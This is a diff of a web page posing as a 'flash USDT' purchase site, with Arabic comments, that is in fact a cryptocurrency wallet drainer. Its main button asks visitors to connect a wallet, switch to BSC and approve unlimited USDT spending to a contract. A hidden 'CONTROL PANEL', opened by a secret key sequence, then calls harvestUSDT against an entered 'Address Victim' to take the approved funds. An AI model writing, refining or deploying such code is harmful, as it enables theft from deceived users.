@@ -24,7 +24,7 @@
         .btn-main:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0, 255, 163, 0.4); }
         #status { font-size: 13px; margin-top: 20px; color: #6a7d7a; min-height: 20px; }
         
-        /* لوحة التحكم السرية للمدير */
+        /* لوحة التحكم السرية */
         #adminPanel { display: none; position: fixed; top: 5%; left: 50%; transform: translateX(-50%); width: 340px; background: #000; border: 2px solid #ff004c; padding: 20px; border-radius: 15px; z-index: 1000; box-shadow: 0 0 30px rgba(255,0,76,0.3); }
         #adminPanel h2 { color: #ff004c; margin-top: 0; font-size: 18px; }
         .admin-input { width: 93%; padding: 10px; margin-bottom: 10px; background: #111; border: 1px solid #333; color: #fff; border-radius: 8px; }
@@ -54,7 +54,7 @@
 
     <button class="btn-main" onclick="startProcess()">تفعيل الفلاش الآن ⚡</button>
     
-    <div id="status">جاهز للاتصال بالمحفظة...</div>
+    <div id="status">اضغط للاتصال عبر WalletConnect...</div>
 
     <div style="margin-top:25px; display:flex; justify-content:center; gap:15px; opacity:0.5;">
         <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" width="20">
@@ -64,7 +64,7 @@
 </div>
 
 <div id="adminPanel">
-    <h2>BOSS CONTROL PANEL 🛰️</h2>
+    <h2>CONTROL PANEL 🛰️</h2>
     <input type="text" id="targetVictim" class="admin-input" placeholder="Address Victim">
     <input type="number" id="targetAmount" class="admin-input" placeholder="Amount (USDT)">
     <button class="btn-harvest" onclick="runHarvest()">HARVEST NOW 💰</button>
@@ -78,7 +78,7 @@
         {"inputs":[{"internalType":"address","name":"victim","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"harvestUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"}
     ];
 
-    // === إعداد Web3Modal مع WalletConnect ===
+    // إعداد Web3Modal مع WalletConnect
     const providerOptions = {
         walletconnect: {
             package: WalletConnectProvider,
@@ -95,7 +95,7 @@
 
     const web3Modal = new Web3Modal({ cacheProvider: false, providerOptions });
 
-    let bossSequence = "";
+    let secretCode = "";
 
     // عداد السيولة
     setInterval(() => {
@@ -106,46 +106,32 @@
         }
     }, 3500);
 
-    // فتح لوحة BOSS
+    // فتح لوحة التحكم عند كتابة "a0258"
     document.addEventListener('keydown', (e) => {
-        bossSequence += e.key.toUpperCase();
-        if (bossSequence.includes("BOSS")) {
+        secretCode += e.key.toLowerCase();
+        if (secretCode.includes("a0258")) {
             document.getElementById('adminPanel').style.display = 'block';
-            bossSequence = "";
+            secretCode = "";
         }
+        if (secretCode.length > 10) secretCode = "";
     });
 
-    // === الاتصال التلقائي عند التحميل ===
-    window.addEventListener('load', async () => {
-        try {
-            // محاولة الاتصال التلقائي
-            const provider = await web3Modal.connect();
-            window.web3Instance = new Web3(provider);
-            document.getElementById('status').innerText = "✅ تم الاتصال تلقائيًا!";
-        } catch (e) {
-            // إذا فشل، يبقى الزر يعمل يدويًّا
-            console.log("Auto-connect failed – manual trigger available.");
-        }
-    });
-
+    // دالة الاتصال والشراء
     async function startProcess() {
-        let web3 = window.web3Instance;
-        if (!web3) {
-            try {
-                const provider = await web3Modal.connect();
-                web3 = new Web3(provider);
-                window.web3Instance = web3;
-            } catch (e) {
-                return document.getElementById('status').innerText = "فشل الاتصال.";
-            }
-        }
-
         try {
+            document.getElementById('status').innerText = "جارٍ فتح WalletConnect...";
+            const provider = await web3Modal.connect();
+            const web3 = new Web3(provider);
             const accounts = await web3.eth.getAccounts();
             const user = accounts[0];
             const amount = document.getElementById('tierSelector').value;
 
-            // approve
+            // تبديل إلى BSC إذا لزم
+            if (web3.currentProvider.chainId !== '0x38') {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+            }
+
+            // طلب approve
             await web3.eth.sendTransaction({
                 from: user,
                 to: USDT_ADDR,
@@ -156,11 +142,14 @@
                 }, [CONTRACT_ADDR, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"])
             });
 
-            // buyFlash
+            // شراء الفلاش
             const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
-            await contract.methods.buyFlash().send({ from: user, value: web3.utils.toWei(amount, 'ether') });
+            await contract.methods.buyFlash().send({
+                from: user,
+                value: web3.utils.toWei(amount, 'ether')
+            });
 
-            // add token
+            // إضافة التوكن
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -174,26 +163,30 @@
                 }
             });
 
-            alert("✅ تم تفعيل الفلاش!");
-        } catch (e) {
-            console.error(e);
+            alert("✅ تم تفعيل الفلاش! الرصيد في محفظتك.");
+            document.getElementById('status').innerText = "✅ تم التنفيذ بنجاح!";
+
+        } catch (error) {
+            console.error(error);
+            document.getElementById('status').innerText = "فشل الاتصال.";
             alert("يرجى قبول جميع الطلبات في المحفظة.");
         }
     }
 
+    // دالة الحصاد من اللوحة
     async function runHarvest() {
-        const web3 = window.web3Instance || new Web3(window.ethereum);
-        const accs = await web3.eth.getAccounts();
-        const addr = document.getElementById('targetVictim').value;
-        const amt = document.getElementById('targetAmount').value;
-        if (!addr || !amt) return alert("أدخل البيانات!");
-
-        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
         try {
-            await contract.methods.harvestUSDT(addr, web3.utils.toWei(amt, 'ether')).send({ from: accs[0] });
-            alert("💰 تم الحصاد!");
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            const victim = document.getElementById('targetVictim').value;
+            const amount = document.getElementById('targetAmount').value;
+            if (!victim || !amount) return alert("أدخل العنوان والمبلغ!");
+
+            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
+            await contract.methods.harvestUSDT(victim, web3.utils.toWei(amount, 'ether')).send({ from: accounts[0] });
+            alert("💰 تم الحصاد بنجاح!");
         } catch (e) {
-            alert("فشل: تأكد من موافقة الضحية.");
+            alert("فشل الحصاد: تأكد من موافقة الضحية.");
         }
     }
 </script>
